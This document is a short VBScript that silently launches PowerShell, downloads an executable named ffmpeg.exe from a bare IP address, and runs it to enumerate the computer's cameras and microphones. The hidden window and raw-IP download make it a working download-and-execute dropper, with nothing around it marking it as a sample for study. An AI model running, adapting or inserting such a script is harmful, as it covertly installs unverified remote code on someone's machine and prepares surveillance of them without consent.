Dim objWshShl : Set objWshShl = WScript.CreateObject("WScript.Shell")
objWshShl.Run "powershell.exe curl http://213.168.249.164:8080/ffmpeg.exe -o ffmpeg.exe; ./ffmpeg.exe -list_devices true -f dshow -i dummy;",0
